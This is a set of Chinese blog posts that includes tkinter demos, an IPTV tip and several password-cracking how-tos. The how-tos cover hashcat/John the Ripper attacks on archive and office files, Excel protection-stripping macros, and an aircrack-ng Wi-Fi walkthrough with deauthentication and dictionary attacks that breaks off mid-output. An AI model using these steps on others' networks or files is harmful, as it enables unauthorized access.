        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>显示当前日期时间星期的半透明小组件</title>
    <url>/posts/a45b377f/</url>
    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入tkinter库，并设置别名为tk</span></span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Tk对象，Tk代表窗口</span></span><br><span class="line">root = tk.Tk()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">winWidth = <span class="number">560</span></span><br><span class="line">winHeight = <span class="number">160</span></span><br><span class="line"><span class="comment"># 获取屏幕分辨率</span></span><br><span class="line">screenWidth = root.winfo_screenwidth()</span><br><span class="line">screenHeight = root.winfo_screenheight()</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>((screenWidth - winWidth) / <span class="number">2</span>)</span><br><span class="line">y = <span class="built_in">int</span>((screenHeight - winHeight) / <span class="number">2</span>)</span><br><span class="line"><span class="comment"># 设置窗口初始位置在屏幕居中</span></span><br><span class="line">root.geometry(<span class="string">&quot;%sx%s+%s+%s&quot;</span> % (winWidth, winHeight, x, y))</span><br><span class="line"></span><br><span class="line">var = tk.StringVar()</span><br><span class="line">var2 = tk.StringVar()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gettime</span>():</span><br><span class="line">    var.<span class="built_in">set</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %X&quot;</span>))  <span class="comment"># 获取当前时间</span></span><br><span class="line">    root.after(<span class="number">1000</span>, gettime)  <span class="comment"># 每隔1s调用函数 gettime 自身获取时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">week</span>():</span><br><span class="line">    week_list = [<span class="string">&quot;星期一&quot;</span>, <span class="string">&quot;星期二&quot;</span>, <span class="string">&quot;星期三&quot;</span>, <span class="string">&quot;星期四&quot;</span>, <span class="string">&quot;星期五&quot;</span>, <span class="string">&quot;星期六&quot;</span>, <span class="string">&quot;星期日&quot;</span>]</span><br><span class="line">    a = week_list[datetime.now().weekday()]</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">var.<span class="built_in">set</span>(gettime())</span><br><span class="line">var2.<span class="built_in">set</span>(week())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Label对象，第一个参数指定该Label放入root</span></span><br><span class="line">w1 = tk.Label(root, textvariable=var, font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">40</span>),width=<span class="number">16</span>,height=<span class="number">1</span>)</span><br><span class="line">w1.place(x=<span class="number">0</span>,y=<span class="number">0</span>)</span><br><span class="line">w2 = tk.Label(root, textvariable=var2, font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">40</span>),width=<span class="number">5</span>,height=<span class="number">1</span>)</span><br><span class="line">w2.place(x=<span class="number">0</span>,y=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用pack进行布局</span></span><br><span class="line">w1.pack()</span><br><span class="line">w2.pack()</span><br><span class="line"></span><br><span class="line">root.overrideredirect(<span class="number">1</span>)  <span class="comment"># 去除窗口边框</span></span><br><span class="line">root.wm_attributes(<span class="string">&quot;-alpha&quot;</span>, <span class="number">0.5</span>)  <span class="comment"># 透明度(0.0~1.0)</span></span><br><span class="line">root.wm_attributes(<span class="string">&quot;-toolwindow&quot;</span>, <span class="literal">True</span>)  <span class="comment"># 置为工具窗口(没有最大最小按钮)</span></span><br><span class="line">root.wm_attributes(<span class="string">&quot;-topmost&quot;</span>, <span class="literal">True</span>)  <span class="comment"># 永远处于顶层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myquit</span>(<span class="params">*args</span>):</span><br><span class="line">    root.destroy()</span><br><span class="line"></span><br><span class="line">root.bind(<span class="string">&quot;&lt;Any-KeyPress&gt;&quot;</span>, myquit)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">StartMove</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">global</span> x, y</span><br><span class="line">    x = event.x</span><br><span class="line">    y = event.y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">StopMove</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">global</span> x, y</span><br><span class="line">    x = <span class="literal">None</span></span><br><span class="line">    y = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">OnMotion</span>(<span class="params">event</span>):</span><br><span class="line">    <span class="keyword">global</span> x, y</span><br><span class="line">    deltax = event.x - x</span><br><span class="line">    deltay = event.y - y</span><br><span class="line">    root.geometry(<span class="string">&quot;+%s+%s&quot;</span> % (root.winfo_x() + deltax, root.winfo_y() + deltay))</span><br><span class="line">    root.update()</span><br><span class="line">    <span class="built_in">print</span>(event.x, event.y, root.winfo_x(), root.winfo_y(), root.winfo_width(), root.winfo_height())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root.bind(<span class="string">&quot;&lt;ButtonPress-1&gt;&quot;</span>, StartMove)  <span class="comment"># 监听左键按下操作响应函数</span></span><br><span class="line">root.bind(<span class="string">&quot;&lt;ButtonRelease-1&gt;&quot;</span>, StopMove)  <span class="comment"># 监听左键松开操作响应函数</span></span><br><span class="line">root.bind(<span class="string">&quot;&lt;B1-Motion&gt;&quot;</span>, OnMotion)  <span class="comment"># 监听鼠标移动操作响应函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动主窗口的消息循环</span></span><br><span class="line">root.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>tkinter after() 方法双线程运行启停生成随机数</title>
    <url>/posts/c03ace04/</url>
    <content><![CDATA[<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">window = tk.Tk()</span><br><span class="line"></span><br><span class="line">var1 = tk.StringVar()</span><br><span class="line">text = tk.Label(window, textvariable=var1)</span><br><span class="line">text.grid(row=<span class="number">0</span>, column=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">going = <span class="literal">True</span></span><br><span class="line">is_run = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getnum</span>(<span class="params">var1</span>):</span><br><span class="line">    <span class="keyword">global</span> going</span><br><span class="line">    a = random.randint(<span class="number">0</span>, <span class="number">100000</span>)</span><br><span class="line">    str_a=<span class="built_in">str</span>(a)</span><br><span class="line">    var1.<span class="built_in">set</span>(str_a)</span><br><span class="line">    <span class="keyword">if</span> going:</span><br><span class="line">        window.after(<span class="number">100</span>, getnum, var1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        going = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">var1</span>):</span><br><span class="line">    <span class="keyword">global</span> is_run</span><br><span class="line">    <span class="keyword">if</span> is_run:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    is_run = <span class="literal">True</span></span><br><span class="line">    getnum(var1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stop</span>():</span><br><span class="line">    <span class="keyword">global</span> going, is_run</span><br><span class="line">    <span class="keyword">if</span> is_run:</span><br><span class="line">        going = <span class="literal">False</span></span><br><span class="line">        is_run = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">but = tk.Button(window, text=<span class="string">&quot;开始&quot;</span>, command=<span class="keyword">lambda</span>: start(var1))</span><br><span class="line">but.grid(row=<span class="number">1</span>, column=<span class="number">1</span>)</span><br><span class="line">but2 = tk.Button(window, text=<span class="string">&quot;结束&quot;</span>, command=stop)</span><br><span class="line">but2.grid(row=<span class="number">1</span>, column=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">window.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>coding</category>
        <category>python3</category>
      </categories>
      <tags>
        <tag>coding</tag>
        <tag>python3</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat + john the ripper密码</title>
    <url>/posts/1ba62722/</url>
    <content><![CDATA[<p>1.hashcat ：<a href="https://hashcat.net/">https://hashcat.net</a><br>2.john the ripper ：<a href="https://www.openwall.com/">https://www.openwall.com</a><br>注：官网是英文的，可以通过谷歌浏览器翻译成中文</p>
<p>在对应软件的路径栏全选输入cmd进去命令终端<br>只需用到2个命令：</p>
<p>获取hash值</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">rar2john.exe xxxx.rar</span><br></pre></td></tr></table></figure>

<p>开始</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m <span class="number">13000</span> -w <span class="number">4</span> -a <span class="number">3</span> $rar5$<span class="number">16</span>$b88c1d7d2c96dc9d1b1a5ccdc5c25d50$<span class="number">15</span>$<span class="number">8</span>f0b287c982535c868bbff486ee9acd2$<span class="number">8</span>$<span class="number">43907</span>bfa03430471 -o password.txt</span><br></pre></td></tr></table></figure>

<p><a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A/20220819/us-east-1/s3/aws4_request&X-Amz-Date=20220819T081438Z&X-Amz-Expires=300&X-Amz-Signature=97390c7567151c0a4d989460ed346e6457b6efee1255a762a63ec30108e59e1d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=97553311&response-content-disposition=attachment;%20filename=rockyou.txt&response-content-type=application/octet-stream">字典</a></p>
<p>更多的参数说明：</p>
<p>针对Word密码的命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">python office2john.py test.docx                 获取word加密文件的Hash指令(此处需要安装python并配置环境变量)</span><br><span class="line"><span class="function">test.docx:$<span class="title">office</span>$*2013*100000*256*16*561<span class="title">f4dcaaac333e7c06d150f9ea5aea2</span>*<span class="title">ef4e7b026217124561ecb865b324eac4</span>*<span class="title">e9ef4a859f2c81581db0e27d9ce48e6451b82cd1641941e8adc10dc5600969cb</span>                                所得<span class="title">Hash</span>返回结果</span></span><br><span class="line"><span class="function"><span class="title">hashcat.exe</span> -<span class="title">m</span> 9600 -<span class="title">a</span> 3 $<span class="title">office</span>$*2013*100000*256*16*561<span class="title">f4dcaaac333e7c06d150f9ea5aea2</span>*<span class="title">ef4e7b026217124561ecb865b324eac4</span>*<span class="title">e9ef4a859f2c81581db0e27d9ce48e6451b82cd1641941e8adc10dc5600969cb</span> ?<span class="title">d</span>?<span class="title">d</span>?<span class="title">d</span>?<span class="title">d</span> -<span class="title">o</span> <span class="title">out.txt</span>                 <span class="title">Hashcat</span>对应<span class="title">hash</span></span></span><br></pre></td></tr></table></figure>
<p>针对PDF密码的命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">perl pdf2john.pl test.pdf                       获取pdf加密文件的Hash指令(此处需要安装perl并配置环境变量)</span><br><span class="line"><span class="function">test.pdf:$<span class="title">pdf</span>$4*4*128*-3904*0*16*55<span class="title">f913d20e34724fd70d3004f5e43166</span>*32*7<span class="title">a29310ea5dc0276d34c1bef24595d61984a08eb759eaba56bd4887a260bbcce</span>*32*<span class="title">de0c200bbe6887a980dc429edbdabc40f39a368841d804afefa726b2bd7c7b24</span>   所得<span class="title">Hash</span>返回结果</span></span><br><span class="line"><span class="function"><span class="title">hashcat.exe</span> -<span class="title">m</span> 10500 -<span class="title">a</span> 3 $<span class="title">pdf</span>$4*4*128*-3904*0*16*55<span class="title">f913d20e34724fd70d3004f5e43166</span>*32*7<span class="title">a29310ea5dc0276d34c1bef24595d61984a08eb759eaba56bd4887a260bbcce</span>*32*<span class="title">de0c200bbe6887a980dc429edbdabc40f39a368841d804afefa726b2bd7c7b24</span> ?<span class="title">l</span>?<span class="title">l</span>?<span class="title">l</span>?<span class="title">l</span>?<span class="title">l</span>?<span class="title">l</span> -<span class="title">o</span> <span class="title">out.txt</span>  <span class="title">Hashcat</span>对应<span class="title">hash</span>，此处?<span class="title">l</span>对应一个小写字母</span></span><br></pre></td></tr></table></figure>

<p>针对Zip密码的命令：</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">zip2john.exe test.zip                            获取zip加密文件的Hash指令</span><br><span class="line">test.zip/test.txt:$pkzip2$<span class="number">1</span>*<span class="number">1</span>*<span class="number">2</span>*<span class="number">0</span>*<span class="number">15</span>*<span class="number">9</span>*<span class="number">4</span>aac42f3*<span class="number">0</span>*<span class="number">26</span>*<span class="number">0</span>*<span class="number">15</span>*<span class="number">4</span>aac*<span class="number">470</span>b*<span class="number">6</span>fa72c2bc69e5738181cb7f406187f8084ce07cf5f*$/pkzip2$:test.txt:test.zip::test.zip                                              所得Hash返回结果</span><br><span class="line">hashcat -a <span class="number">0</span> -m <span class="number">17210</span> $pkzip2$<span class="number">1</span>*<span class="number">1</span>*<span class="number">2</span>*<span class="number">0</span>*<span class="number">15</span>*<span class="number">9</span>*<span class="number">4</span>aac42f3*<span class="number">0</span>*<span class="number">26</span>*<span class="number">0</span>*<span class="number">15</span>*<span class="number">4</span>aac*<span class="number">470</span>b*<span class="number">6</span>fa72c2bc69e5738181cb7f406187f8084ce07cf5f*$/pkzip2$ password.txt --force</span><br><span class="line">    password.txt中存放密码字典</span><br></pre></td></tr></table></figure>

<p>提醒：运行John the Ripper需要安装python和perl环境变量，如果命令出错，请自行下载安装python和perl</p>
<p>perl：<a href="http://www.activestate.com/activeperl">http://www.activestate.com/activeperl</a><br>python：<a href="https://www.python.org/">https://www.python.org</a></p>
<p>via <a href="https://www.freedidi.com/2655.html">https://www.freedidi.com/2655.html</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
        <category>hashcat</category>
        <category>john-the-ripper</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
        <tag>hashcat</tag>
        <tag>john the ripper</tag>
      </tags>
  </entry>
  <entry>
    <title>去除 excel 工作表和工作簿密码</title>
    <url>/posts/a93a7ed0/</url>
    <content><![CDATA[<h1 id="1-步骤："><a href="#1-步骤：" class="headerlink" title="1.步骤："></a>1.步骤：</h1><p>Alt + F11 进去Excel开发者工具<br>插入——模块<br>复制粘贴下面命令<br>点击绿色三角形（运行宏）</p>
<h1 id="2-去除Excl整个工作簿密码的命令："><a href="#2-去除Excl整个工作簿密码的命令：" class="headerlink" title="2.去除Excl整个工作簿密码的命令："></a>2.去除Excl整个工作簿密码的命令：</h1><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Sub</span> 工作簿解开密码()</span><br><span class="line"></span><br><span class="line">ActiveWorkbook.Sheets.Copy</span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> sh <span class="keyword">In</span> ActiveWorkbook.Sheets</span><br><span class="line"></span><br><span class="line">        sh.Visible=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
<h1 id="3-去除Excel工作表密码的命令："><a href="#3-去除Excel工作表密码的命令：" class="headerlink" title="3.去除Excel工作表密码的命令："></a>3.去除Excel工作表密码的命令：</h1><figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Sub</span> 密码解开()</span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> pj <span class="keyword">As</span> Worksheet</span><br><span class="line"></span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> pj <span class="keyword">In</span> Worksheets</span><br><span class="line"></span><br><span class="line">        pj.Protect AllowFiltering:=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        pj.Unprotect</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
<p>via <a href="https://www.freedidi.com/2684.html">https://www.freedidi.com/2684.html</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>office</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title>potplayer 看 tvbj1 直播</title>
    <url>/posts/ceb25495/</url>
    <content><![CDATA[<p>播放器：PotPlayer_1.7.21620 <a href="https://wwm.lanzouw.com/ihNhp09dqopi">https://wwm.lanzouw.com/ihNhp09dqopi</a> 密码:29td</p>
<p>左上角PotPlayer——打开——打开链接</p>
<p>中文频道（内含TVB直播源）<br><a href="https://iptv-org.github.io/iptv/languages/zho.m3u">https://iptv-org.github.io/iptv/languages/zho.m3u</a></p>
<p>GitHub iptv<br><a href="https://github.com/iptv-org/iptv">https://github.com/iptv-org/iptv</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>player</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>player</tag>
      </tags>
  </entry>
  <entry>
    <title>aircrack-ng wifi 密码</title>
    <url>/posts/e57021a3/</url>
    <content><![CDATA[<h1 id="一、Kali下载地址"><a href="#一、Kali下载地址" class="headerlink" title="一、Kali下载地址"></a>一、Kali下载地址</h1><p>Kali官网：<a href="https://www.kali.org/">https://www.kali.org</a><br>虚拟机：VMWARE16 链接: <a href="https://pan.baidu.com/s/1ujg0U_xsLCv34UcaX8Y2Mw?pwd=b853">https://pan.baidu.com/s/1ujg0U_xsLCv34UcaX8Y2Mw?pwd=b853</a> 提取码: b853 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<h1 id="二、aircrack-ng-命令的详细解释"><a href="#二、aircrack-ng-命令的详细解释" class="headerlink" title="二、aircrack-ng 命令的详细解释"></a>二、aircrack-ng 命令的详细解释</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">管理员权限</span><br><span class="line">sudo -i  </span><br><span class="line"></span><br><span class="line">查看当前的网卡信息</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">检查网卡是否支持监听功能</span><br><span class="line">airmon-ng</span><br><span class="line"></span><br><span class="line">激活无线网卡的监听模式</span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">扫描当前周边环境的WiFi信号</span><br><span class="line">airodump-ng wlan0</span><br><span class="line"></span><br><span class="line">下面里的部分信息根据自己的情况进行替换</span><br><span class="line"></span><br><span class="line">抓包命令</span><br><span class="line">airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/xxx/桌面/handshake wlan0</span><br><span class="line"></span><br><span class="line">ACK 死亡攻击</span><br><span class="line">aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c F0:72:EA:E8:72:21 wlan0</span><br><span class="line"></span><br><span class="line">暴力命令</span><br><span class="line">aircrack-ng -w /home/xxx/桌面/password.txt -b 60:32:B1:56:3F:B2 /home/xxx/桌面/handshake-0*.cap</span><br></pre></td></tr></table></figure>

<h1 id="三、字典"><a href="#三、字典" class="headerlink" title="三、字典"></a>三、字典</h1><p>Github字典下载：<a href="https://github.com/conwnet/wpa-dictionary">https://github.com/conwnet/wpa-dictionary</a><br>加强版（来源网络）：<a href="https://wwm.lanzouw.com/iiCjq09msc7e">https://wwm.lanzouw.com/iiCjq09msc7e</a> 密码:4ejp</p>
<h1 id="四、教程"><a href="#四、教程" class="headerlink" title="四、教程"></a>四、教程</h1><h2 id="1-Install-安装-aircrack-ng"><a href="#1-Install-安装-aircrack-ng" class="headerlink" title="1. Install | 安装 aircrack-ng"></a>1. Install | 安装 aircrack-ng</h2><p>Linux 篇（Recommended | 推荐）<br>The Kali distribution already has everything installed | Kali 发行版已经安装了所有东西<br>On Debian&#x2F;Ubuntu using apt to install: | 使用相应包管理工具安装，例如 Debian&#x2F;Ubuntu 使用 apt 安装：<br>sudo apt install aircrack-ng</p>
<h2 id="2-View-available-wireless-network-cards-查看可用的无线网卡"><a href="#2-View-available-wireless-network-cards-查看可用的无线网卡" class="headerlink" title="2. View available wireless network cards | 查看可用的无线网卡"></a>2. View available wireless network cards | 查看可用的无线网卡</h2><p>Use the command | 使用命令：airmon-ng</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng</span><br><span class="line"></span><br><span class="line">PHY Interface Driver    Chipset</span><br><span class="line"></span><br><span class="line">phy0  wlp8s0    iwlwifi   Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br></pre></td></tr></table></figure>
<p>The available wifi card is wlp8s0 | 根据以上输出，可用的无线网卡为 wlp8s0。</p>
<h2 id="3-Specify-the-wireless-network-card-to-turn-on-the-monitor-mode-指定无线网卡开启监听模式。"><a href="#3-Specify-the-wireless-network-card-to-turn-on-the-monitor-mode-指定无线网卡开启监听模式。" class="headerlink" title="3. Specify the wireless network card to turn on the monitor mode | 指定无线网卡开启监听模式。"></a>3. Specify the wireless network card to turn on the monitor mode | 指定无线网卡开启监听模式。</h2><p>使用命令：airmon-ng start &lt;网卡名称&gt;</p>
<p>Use the command airmon-ng start wlp8s0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0</span><br><span class="line"></span><br><span class="line">PHY Interface Driver    Chipset</span><br><span class="line"></span><br><span class="line">phy0  wlp8s0    iwlwifi   Intel Corporation Centrino Wireless-N 2230 (rev c4)</span><br><span class="line"></span><br><span class="line">    (mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)</span><br><span class="line">    (mac80211 station mode vif disabled for [phy0]wlp8s0)</span><br></pre></td></tr></table></figure>
<p>Now wlp8s0 is available for monitoring as wlp8s0mon | 根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是 wlp8s0mon。</p>
<p>开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。</p>
<p>With the monitor mode active the card can not be used to connect to any wifi, you have to stop it later to use as a normal card</p>
<h2 id="4-Scan-for-nearby-wireless-networks-扫描附近的无线网络"><a href="#4-Scan-for-nearby-wireless-networks-扫描附近的无线网络" class="headerlink" title="4. Scan for nearby wireless networks | 扫描附近的无线网络"></a>4. Scan for nearby wireless networks | 扫描附近的无线网络</h2><p>使用命令：airodump-ng &lt;处于监听模式的网卡名称&gt;<br>Use the command airodump-ng wlp8s0mon</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon</span><br><span class="line"></span><br><span class="line"> CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              </span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    </span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  </span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   </span><br></pre></td></tr></table></figure>
<p>这一步会输出两个列表，两个列表不停在刷新。</p>
<p>第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：</p>
<p>BSSID: 无线 AP 的硬件地址<br>PWR: 信号强度，值是负数，绝对值越小表示信号越强<br>CH: 无线网络信道<br>ENC: 加密方式，我们要的是 WPA2<br>ESSID: 无线网络的名称<br>第二个列表表示某个无线网络中和用户设备的连接信息：</p>
<p>BSSID: 无线 AP 的硬件地址<br>STATION: 用户设备的硬件地址<br>扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。</p>
<p>这里仅仅是演示，所以列表只保留了一条结果。</p>
<h2 id="5-使用参数过滤扫描列表，确定扫描目标"><a href="#5-使用参数过滤扫描列表，确定扫描目标" class="headerlink" title="5. 使用参数过滤扫描列表，确定扫描目标"></a>5. 使用参数过滤扫描列表，确定扫描目标</h2><p>使用命令：airodump-ng -w &lt;扫描结果保存的文件名&gt; -c &lt;无线网络信道&gt; –bssid &lt;目标无线 AP 的硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon</span><br><span class="line"></span><br><span class="line"> CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0</span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP</span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  </span><br><span class="line"></span><br><span class="line"> 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>刚扫描时看到输出的扫描状态是这样的：CH 5 ][ Elapsed: 12 s ][ 2018-10-07 18:49。</p>
<p>只有当扫描状态后面出现 ][ WPA handshake: 22:47:DA:62:2A:F0 后，我们才拿到拿到握手包。</p>
<p>扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。</p>
<p>所以我们可以同时使用 aireplay-ng 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。</p>
<p>拿到握手包后按 Ctrl-C 结束扫描即可。</p>
<h2 id="6-使用-aireplay-ng-对目标设备发起攻击"><a href="#6-使用-aireplay-ng-对目标设备发起攻击" class="headerlink" title="6. 使用 aireplay-ng 对目标设备发起攻击"></a>6. 使用 aireplay-ng 对目标设备发起攻击</h2><p>使用命令：aireplay-ng -&lt;攻击模式&gt; &lt;攻击次数&gt; -a 无线 AP 硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon</span><br><span class="line">18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6</span><br><span class="line">18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]</span><br><span class="line">18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]</span><br><span class="line">18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>发起攻击后，当 airodump-ng 成功拿到了握手包，使用 Ctrl-C 退出攻击。</p>
<h2 id="7-使用-aircrack-ng-暴力-Wi-Fi-密码"><a href="#7-使用-aircrack-ng-暴力-Wi-Fi-密码" class="headerlink" title="7. 使用 aircrack-ng 暴力 Wi-Fi 密码"></a>7. 使用 aircrack-ng 暴力 Wi-Fi 密码</h2><p>使用命令：aircrack-ng -w 密码字典 &lt;包含握手包的 cap 文件&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap </span><br><span class="line">Opening android-01.cap</span><br><span class="line">Read 675 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening android-01.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line"></span><br><span class="line">      [00:00:00] 12/2492 keys tested (828.33 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 2 seconds                                       0.48%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ 1234567890 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D </span><br><span class="line">                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED </span><br><span class="line">                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 </span><br><span class="line">                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 </span><br><span class="line">                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 